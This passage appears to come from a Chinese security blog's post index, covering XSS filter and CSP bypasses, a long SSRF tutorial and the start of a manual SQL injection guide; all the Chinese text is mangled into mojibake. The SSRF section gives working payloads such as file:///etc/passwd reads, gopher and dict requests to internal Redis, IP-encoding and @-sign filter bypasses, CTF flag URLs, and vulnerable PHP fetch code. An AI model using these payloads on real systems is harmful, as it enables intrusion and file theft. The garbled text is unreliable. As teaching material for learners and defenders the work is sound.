æˆ– è§¦å‘æœåŠ¡å™¨ç«¯è¯·æ±‚ æ¥åˆ©ç”¨ Cookie è¾“å…¥éªŒè¯å’Œè½¬ä¹‰ è¾“å…¥éªŒè¯ï¼šé™åˆ¶è¾“å…¥å­—ç¬¦ï¼Œåªå…è®¸å®‰å…¨å­—ç¬¦ï¼ˆå¦‚ a-zA-Z0-9ï¼‰ HTMLè½¬ä¹‰ï¼šå®ä½“ç¼–ç  é˜²æ­¢æ¶æ„è„šæœ¬è¢«æ³¨å…¥åˆ°ç½‘é¡µä¸­ ç»•è¿‡ ç»•è¿‡æ–¹å¼ è¯´æ˜ åŒé‡ç¼–ç ç»•è¿‡ æœ‰äº› WAF åªè½¬ä¹‰äº†ä¸€æ¬¡ï¼Œå¯ä»¥å°è¯• scriptalert(1)/script è®©æœåŠ¡å™¨è¯¯è§£ äº‹ä»¶å±æ€§ç»•è¿‡ å¦‚æœ script è¢«æ‹¦æˆªï¼Œå¯ä»¥å°è¯• img src=x onerror=alert(1) DOM XSS å¦‚æœåç«¯è½¬ä¹‰äº†ï¼Œä½†å‰ç«¯ç”¨ innerHTML æ¸²æŸ“æ•°æ®ï¼Œä»ç„¶å¯ä»¥æ‰§è¡Œ XSS ä»£ç  JSON è§£ææ¼æ´ JSON å¯èƒ½ä¼šååºåˆ—åŒ–æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ data: scriptalert(1)/script ä½¿ç”¨ CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ é™åˆ¶é¡µé¢ä¸­å…è®¸æ‰§è¡Œçš„è„šæœ¬æ¥æºï¼Œé˜²æ­¢å¤–éƒ¨ XSS ä»£ç æ³¨å…¥ ç»•è¿‡ ç»•è¿‡æ–¹å¼ è¯´æ˜ JSONP ç»•è¿‡ æŸäº› API å…è®¸ JSONP è¯·æ±‚ï¼Œä»å¯æ‰§è¡Œå¤–éƒ¨ä»£ç  å†…è”äº‹ä»¶ç›‘å¬ onclick=alert(1) å¯èƒ½ä»ç„¶æœ‰æ•ˆ æ•°æ® URI ç»•è¿‡ æŸäº› data: æ–¹æ¡ˆä»ç„¶å¯ä»¥æ‰§è¡Œä»£ç  åŠ¨æ€ JavaScript æ‰§è¡Œ eval(), setTimeout(), Function() å¯èƒ½ä»ç„¶å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç  Cookie SameSite å±æ€§ é™åˆ¶ Cookie çš„è·¨ç«™ç‚¹å‘é€è¡Œä¸º ç»•è¿‡ ç»•è¿‡æ–¹å¼ è¯´æ˜ CORS é…åˆ XSS ç»•è¿‡ å¦‚æœ Access-Control-Allow-Origin: *ï¼Œå¯ä»¥ç”¨ fetch() è¯·æ±‚è·å–æ•æ„Ÿæ•°æ® ç«™å†…è·³è½¬ç»•è¿‡ SameSite=Lax å…è®¸ GET è¯·æ±‚ï¼Œæ‰€ä»¥å¯ä»¥è¯±å¯¼ç”¨æˆ·ç‚¹å‡»é“¾æ¥ å‚è€ƒæ–‡ç« ï¼š å¯¹äºXSSè·¨ç«™è„šæœ¬æ”»å‡»çš„å­¦ä¹ -å…ˆçŸ¥ç¤¾åŒº å‰ç«¯å®‰å…¨ä¹‹ CSP åŠå…¶å¸¸è§ç»•è¿‡ BUUCTFä¸Šçš„XSSé¶åœº","tags":["æ¼æ´","XSS"],"categories":["æ¼æ´"]},{"title":"SSRFæ¼æ´","path":"/2025/07/09/SSRFæ¼æ´/","content":"SSRFæ¼æ´ åŸºç¡€çŸ¥è¯† æ¦‚è¿° SSRF (Server-Side Request Forgery,æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ(æ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡ç«¯èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ) å¤§ç™½è¯ï¼šåˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘è¿›è¡Œæ”»å‡» ä¸»è¦æ”»å‡»æ–¹å¼ å½“æ”»å‡»è€…æƒ³è¦è®¿é—®æœåŠ¡å™¨Bä¸Šçš„æœåŠ¡ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨é˜²ç«å¢™æˆ–è€…æœåŠ¡å™¨Bæ˜¯å±äºå†…ç½‘ä¸»æœºç­‰åŸå› å¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ã€‚å¦‚æœæœåŠ¡å™¨Aå­˜åœ¨SSRFæ¼æ´ï¼Œè¿™æ—¶æ”»å‡»è€…å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨Aæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡æœåŠ¡å™¨Aå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»å†…ç½‘çš„ç›®çš„ ç¤ºä¾‹ï¼š æ¼æ´åœºæ™¯ï¼šæŸç½‘ç«™æœ‰ä¸€ä¸ªåœ¨çº¿åŠ è½½åŠŸèƒ½å¯ä»¥æŠŠæŒ‡å®šçš„è¿œç¨‹æ–‡ç« åŠ è½½åˆ°æœ¬åœ°ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š http://www.xxx.com/article.php?url=https://blog.csdn.net/qq_43531669/article/details/112498646 å‡å¦‚ç³»ç»Ÿæ²¡æœ‰å¯¹urlå‚æ•°è¿›è¡Œä»»ä½•çš„æ£€æŸ¥ï¼Œå°±å¯ä»¥æ„é€ å…¶ä»–çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼š http://www.xxx.com/article.php?url=http://127.0.0.1:22http://www.xxx.com/article.php?url=file:///etc/passwdhttp://www.xxx.com/article.php?url=dict://127.0.0.1:22/data:data2 (dictå¯ä»¥å‘æœåŠ¡ç«¯å£è¯·æ±‚data data2)http://www.xxx.com/article.php?url=gopher://127.0.0.1:2233/_test (å‘2233ç«¯å£å‘é€æ•°æ®test,åŒæ ·å¯ä»¥å‘é€POSTè¯·æ±‚) åŸç† SSRFæ¼æ´å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ”¹æ¼æ´è·å–å†…éƒ¨ç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼ˆå› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…ç½‘ç³»ç»Ÿï¼‰ å¾ˆå¤šç½‘ç«™æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚é€šè¿‡æŒ‡å®šçš„URLï¼Œç½‘ç«™å¯ä»¥ä»å…¶ä»–åœ°æ–¹è·å–å›¾ç‰‡ã€ä¸‹è½½æ–‡ä»¶ã€è¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚ SSRFçš„å®è´¨å°±æ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Webç«™ç‚¹ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚ å±å®³ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ã€‚ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚ å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚ æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GETè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»(æ¯”å¦‚struts2ã€SQliç­‰)ã€‚ åˆ©ç”¨fileã€gopherã€dictåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ç­‰ http://localhost:6379/ï¼ˆRedis é»˜è®¤ç«¯å£ï¼‰ http://127.0.0.1:3306/ï¼ˆMySQL é»˜è®¤ç«¯å£ï¼‰ http://192.168.0.1:8000/ï¼ˆå¸¸è§çš„å†…ç½‘ Web æœåŠ¡ç«¯å£ï¼‰ æ¼æ´æ£€æµ‹ æ¼æ´éªŒè¯ é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘é€çš„æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´ã€‚ åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸ºhttp://www.xxx.com/a.php?image=åœ°å€å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´ æ¼æ´å¯èƒ½å‡ºç°ç‚¹ åˆ†äº«åŠŸèƒ½ http://share.xxx.com/index.php?url=http://www.xxx.com é€šè¿‡urlå‚æ•°çš„è·å–æ¥å®ç°ç‚¹å‡»é“¾æ¥çš„æ—¶å€™è·³åˆ°æŒ‡å®šçš„åˆ†äº«æ–‡ç«  å›¾ç‰‡åŠ è½½/ä¸‹è½½ http://image.xxx.com/image.php?image=http://www.xxx.com å›¾ç‰‡åŠ è½½å­˜åœ¨äºå¾ˆå¤šçš„ç¼–è¾‘å™¨ä¸­ï¼Œç¼–è¾‘å™¨ä¸Šä¼ å›¾ç‰‡å¤„åŠ è½½è®¾å®šå¥½çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡åœ°å€ å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ http://title.xxx.com/title?title=http://title.xxx.com/xxx ä¾‹å¦‚ titleå‚æ•°æ˜¯æ–‡ç« çš„æ ‡é¢˜åœ°å€ï¼Œä»£è¡¨äº†ä¸€ä¸ªæ–‡ç« çš„åœ°å€é“¾æ¥ï¼Œå¦‚æœæ”¶è—åŠŸèƒ½é‡‡ç”¨äº†æ­¤ç§å½¢å¼ä¿å­˜æ–‡ç« ï¼Œåˆ™åœ¨æ²¡æœ‰é™åˆ¶å‚æ•°çš„å½¢å¼ä¸‹å¯èƒ½å­˜åœ¨SSRF è½¬ç æœåŠ¡ é€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ åœ¨çº¿ç¿»è¯‘ ç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹ é‚®ä»¶ç³»ç»Ÿ æ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€ ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domain ç»•è¿‡ éƒ¨åˆ†å­˜åœ¨æ¼æ´ï¼Œæˆ–è€…å¯èƒ½äº§ç”ŸSSRFçš„åŠŸèƒ½ä¸­åšäº†ç™½åå•æˆ–è€…é»‘åå•çš„å¤„ç†ï¼Œæ¥è¾¾åˆ°é˜»æ­¢å¯¹å†…ç½‘æœåŠ¡å’Œèµ„æºçš„æ”»å‡»å’Œè®¿é—®ã€‚å› æ­¤æƒ³è¦è¾¾åˆ°SSRFçš„æ”»å‡»ï¼Œéœ€è¦å¯¹è¯·æ±‚çš„å‚æ•°åœ°å€åšç›¸å…³çš„ç»•è¿‡å¤„ç† å¸¸è§é™åˆ¶ 1.é™åˆ¶ä¸ºhttp://www.xxx.comåŸŸå é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ http://www.xxx.com@www.xxc.com 2.é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€ å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶ ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡ ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸå ï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢ 3.é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®® ï¼ˆ1ï¼‰é‡‡å–302è·³è½¬ ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€ ç»•è¿‡é™åˆ¶ä¸ºæŸç§åŸŸå @ç»•è¿‡ å½“ç½‘ç«™é™åˆ¶åªèƒ½è®¿é—® http://www.xxx.comç±»å‹çš„åŸŸåæ—¶ï¼Œå¯ä»¥é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ å¦‚ï¼šhttp://www.xxx.com@www.xxc.com åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œä¾‹å¦‚ï¼š http://www.aaa.com@www.bbb.com@www.ccc.com åœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ« www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸º www.bbb.com è¦æ±‚URLä¸­å¿…é¡»åŒ…å«http://notfound.ctfhub.comï¼Œæ¥å°è¯•åˆ©ç”¨URLçš„ä¸€äº›ç‰¹æ®Šåœ°æ–¹ç»•è¿‡è¿™ä¸ªé™åˆ¶å§ æ„é€ payloadï¼š ?url=http://notfound.ctfhub.com@127.0.0.1/flag.php å¦‚æœè¦æ±‚ä»¥http://notfound.ctfhubå¼€å¤´.com ç»“å°¾çš„è¯ï¼Œä¾æ—§å¯ä»¥ä½¿ç”¨@ payload ?url=http://notfound.ctfhub@127.0.0.1/flag.php.com æˆ–è€…ï¼š ?url=http://ctf.@127.0.0.1/flag.php#show æ­¤ç±»éœ€è¦æŸæŸå¼€å¤´ æŸæŸç»“æŸçš„é¢˜ç›®å‡å¯ä½¿ç”¨@è¿›è¡Œç»•è¿‡ ç»•è¿‡é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€ åˆ©ç”¨å¥å· 127ã€‚0ã€‚0ã€‚1 127.0.0.1 åˆ©ç”¨[::] å¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost http://[::]:80/ http://127.0.0.1 æ·»åŠ ç«¯å£å· http://127.0.0.1:8080 åˆ©ç”¨çŸ­ç½‘å€ çŸ­ç½‘å€ ä½¿ç”¨è§£æåˆ°å†…ç½‘çš„åŸŸå å¦‚æœæœåŠ¡ç«¯æ²¡æœ‰å…ˆè§£æIPå†è¿‡æ»¤å†…ç½‘åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨localhostç­‰è§£æåˆ°å†…ç½‘çš„åŸŸåã€‚ å¦å¤– xip.io æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„æœåŠ¡ï¼Œè¿™ä¸ªç½‘ç«™çš„å­åŸŸåä¼šè§£æåˆ°å¯¹åº”çš„IPï¼Œä¾‹å¦‚192.168.0.1.xip.ioï¼Œè§£æåˆ°192.168.0.1 xip.io æ˜¯ä¸€ä¸ªé€šé…ç¬¦ DNS è§£ææœåŠ¡ï¼Œå®ƒå¯ä»¥å°†ç‰¹å®šæ ¼å¼çš„åŸŸåè§£æä¸ºä»»æ„ IP åœ°å€ï¼Œå¸¸ç”¨äºå¼€å‘å’Œå†…ç½‘æµ‹è¯• é‡‡ç”¨è¿›åˆ¶è½¬æ¢ è‹¥å¯¹IPè¿›è¡Œæ­£åˆ™è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡æ”¹å†™IPå½¢å¼æ¥ç»•è¿‡ å¯¹äºè¿™ç§è¿‡æ»¤æˆ‘ä»¬é‡‡ç”¨æ”¹ç¼–IPçš„å†™æ³•çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚127.0.0.1è¿™ä¸ªIPåœ°å€å¯ä»¥è¢«æ”¹å†™æˆï¼š åè¿›åˆ¶æ•´æ•°è¡¨ç¤º 2130706433 å…«è¿›åˆ¶è¡¨ç¤º 0177.0.0.01 åå…­è¿›åˆ¶è¡¨ç¤º 0x7F000001 æ··åˆè¿›åˆ¶ 127.0x0.1 127.1 0x7f.1 è®¿é—®æ”¹å†™åçš„IPåœ°å€æ—¶ï¼ŒApacheä¼šæŠ¥400 Bad Requestï¼Œä½†Nginxã€MySQLç­‰å…¶ä»–æœåŠ¡ä»èƒ½æ­£å¸¸å·¥ä½œã€‚ å¦å¤–ï¼Œ0.0.0.0è¿™ä¸ªIPå¯ä»¥ç›´æ¥è®¿é—®åˆ°æœ¬åœ°ï¼Œä¹Ÿé€šå¸¸è¢«æ­£åˆ™è¿‡æ»¤é—æ¼ 302è·³è½¬ é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®æ—¶ä½¿ç”¨ ç”Ÿæˆ302è·³è½¬åœ°å€ é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®® é‡‡ç”¨302è·³è½¬ é‡‡ç”¨çŸ­åœ°å€ å›ç¯åœ°å€ç»•è¿‡ å›ç¯åœ°å€ä¸æ­¢127.0.0.1ï¼Œè¿™ä¾¿æœ‰äº†å¾ˆå¤§çš„æ“ä½œç©ºé—´ url=http://0/flag.phpurl=http://0.0/flag.phpurl=http://sudo.cc/flag.phphttp://localhost/http://[0:0:0:0:0:ffff:127.0.0.1]/http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘  åˆ©ç”¨URLä¼ªåè®® Gopheråè®®ï¼ˆä¸‡èƒ½åè®®ï¼‰ gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†åœ¨ä¸€ä¸ªurlå‚æ•°ä¸­æ„é€ POSTæˆ–è€…GETè¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»å†…ç½‘åº”ç”¨çš„ç›®çš„ã€‚ä¾‹å¦‚å¯ä»¥ä½¿ç”¨gopheråè®®å¯¹ä¸å†…ç½‘çš„RedisæœåŠ¡è¿›è¡Œæ”»å‡» fileåè®® è¯»å–æ–‡ä»¶å¾ˆå¥½ç”¨ åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹ file://var/www/html/flag.php dictåè®® dict åè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œé€šå¸¸ç”¨äºè®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºï¼Œèƒ½ç”¨æ¥æ¢æµ‹å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ åè®®æ ¼å¼ï¼šdict://host:port/dict-path ä¸€èˆ¬ç”¨dict://host:port/info æ¢æµ‹ç«¯å£åº”ç”¨ä¿¡æ¯ dict://127.0.0.1:6379 //æ¢æµ‹redisæ˜¯å¦å­˜æ´»dict://127.0.0.1:6379/info //æ¢æµ‹ç«¯å£åº”ç”¨ä¿¡æ¯ æ¼æ´åˆ©ç”¨ äº§ç”Ÿæ¼æ´çš„å‡½æ•° SSRFæ¶‰åŠåˆ°çš„å±é™©å‡½æ•°ä¸»è¦æ˜¯ç½‘ç»œè®¿é—®ï¼Œæ”¯æŒä¼ªåè®®çš„ç½‘ç»œè¯»å– file_get_contents() file_get_contentså‡½æ•°å¯ä»¥å¯¹æœ¬åœ°æ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œä¹Ÿå¯ä»¥å¯¹è¿œç¨‹æ–‡ä»¶è¿›è¡Œè¯»å– æ¡ä»¶ PHP 4 = 4.3.0, PHP 5, PHP 7, PHP 8 åˆ©ç”¨ ?php$url = $_GET[url];;echo file_get_contents($url);? è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ä¸”æ­¤å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³• æ¯”å¦‚ï¼šä¸‹é¢çš„ä»£ç æ‰§è¡Œç»“æœæ˜¯è¾“å‡ºtest.txtæ–‡ä»¶é‡Œé¢çš„å­—ç¬¦ä¸² ?phpecho file_get_contents(â€œtest.txtâ€);? fsockopen() æ¡ä»¶ PHP 4, PHP 5, PHP 7, PHP 8 åˆ©ç”¨ ?php function GetFile($host,$port,$link) $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) echo $errstr (error number $errno) ; else $out = GET $link HTTP/1.1\\r ; $out .= Host: $host\\r ; $out .= Connection: Close\\r \\r ; $out .= \\r ; fwrite($fp, $out); $contents=; while (!feof($fp)) $contents.= fgets($fp, 1024); fclose($fp); return $contents; ? fsockopenå‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™ curl_exec() æ¡ä»¶ PHP 4 = 4.0.2, PHP 5, PHP 7, PHP 8 åˆ©ç”¨ ?php if (isset($_POST[url])) $link = $_POST[url]; $curlobj = curl_init();// åˆ›å»ºæ–°çš„ cURL èµ„æº curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// è®¾ç½® URL å’Œç›¸åº”çš„é€‰é¡¹ $result=curl_exec($curlobj);// æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ curl_close($curlobj);// å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº $filename = ./curled/.rand()..txt; file_put_contents($filename, $result); echo $result;? curl_execå‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯ 1.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper 2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç  3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥ 4.curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨ 5.curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ 6.file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®® æ­¥éª¤ æŠŠurlä¸­çš„å†…å®¹æ”¹æˆå†…ç½‘çš„å…¶ä»–æœåŠ¡å™¨ä¸Šåœ°å€å’Œç«¯å£ï¼Œæ¢æµ‹å†…ç½‘ä¿¡æ¯ï¼Œæ¯”å¦‚ç«¯å£å¼€æ”¾æƒ…å†µ ?url=http://127.0.0.1:22 å†æ‰“å¼€Burpï¼ŒæŠ“åŒ…å‘åˆ°Intruderï¼Œè®¾ç½®Payloadï¼ˆç«¯å£å¤„ï¼‰ çˆ†ç ´ï¼Œæ£€æµ‹åˆ°äº†å†…ç½‘ä¸»æœºçš„80ç«¯å£ï¼ˆä¾‹å­ï¼‰æ˜¯å¼€æ”¾çš„ ä¹Ÿå¯ä»¥é€šè¿‡SSRFæ¼æ´è¯»å–å†…ç½‘æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œä¾‹å¦‚å°†urlä¿®æ”¹ä¸º ?url=file:///c:/windows/system.ini é˜²å¾¡SSRF ç¦æ­¢è·³è½¬ ç¦ç”¨é™¤httpå’Œhttpså¤–çš„åè®®ï¼Œå¦‚ï¼šfile://ã€gopher://ã€dict://ç­‰ã€‚ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œå¦‚ 80ã€443ã€8080ã€‚ ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç¨‹æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚ å¯¹è¯·æ±‚åœ°å€è®¾ç½®ç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IPï¼Œä»¥é˜²æ­¢å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚ å‚è€ƒï¼š SSRFå…¥é—¨-Pax SSRFæ¼æ´ï¼ˆåŸç†ã€æŒ–æ˜ç‚¹ã€æ¼æ´åˆ©ç”¨ã€ä¿®å¤å»ºè®®ï¼‰ SSRFæ¼æ´åŸç†è§£æ[é€šä¿—æ˜“æ‡‚]-è…¾è®¯äº‘","tags":["æ¼æ´","SSRF"],"categories":["æ¼æ´"]},{"title":"SQLæ‰‹å·¥æ³¨å…¥åŸºæœ¬æ­¥éª¤","path":"/2025/07/09/SQLæ³¨å…¥/","content":"SQLæ‰‹å·¥æ³¨å…¥åŸºæœ¬æ­¥éª¤ æ³¨å…¥å§¿åŠ¿ æ­¥éª¤ 1.å¯»æ‰¾æ³¨å…¥ç‚¹ï¼ˆå’Œæ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹ï¼‰ä¸æ•°æ®ä¼ è¾“çš„ç±»å‹ ç™»å½•ï¼Œæ³¨å†Œï¼Œæœç´¢æ¡† 2.åˆ¤æ–­é—­åˆæ–¹å¼ å…ˆåˆ¤æ–­æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ ?id=1aï¼šæ•°å­—å‹ï¼šæŠ¥é”™ å­—ç¬¦å‹ï¼šæ­£å¸¸ å†åˆ¤æ–­é—­åˆæ–¹å¼ï¼ˆå­—ç¬¦å‹ï¼‰ ?id=1a (å…ˆåŠ å•å¼•å·ï¼Œå†åŠ åŒå¼•å·ï¼Œç›´åˆ°æŠ¥é”™) æ³¨æ„ï¼šâ€˜â€™ã€â€œâ€ã€ ()ã€éƒ½æ˜¯æˆåŒæˆå¯¹ éªŒè¯è¾“å…¥å†…å®¹æ•°æ®åº“èƒ½å¦æ‰§è¡Œ(åŠ å•å¼•å·è®©SQLè¯­å¥å‘ç”Ÿé”™è¯¯ï¼Œç ´åSQLè¯­å¥çš„å®Œæ•´æ€§ï¼Œæ²¡æœ‰è¾¾åˆ°SQLè¯­å¥è¯­æ³•è§„åˆ™ï¼Œä»è€Œåˆ¤æ–­å¯å®ç°sqlæ³¨å…¥) ?id=1 and 1=1 #é¡µé¢è¿”å›æ­£å¸¸?id=1 and 1=2 #é¡µé¢è¿”å›å¼‚å¸¸æˆ–?id=1 or 1=2 #é¡µé¢è¿”å›æ­£å¸¸?id=1 or 1=1 #é¡µé¢è¿”å›å¼‚å¸¸ 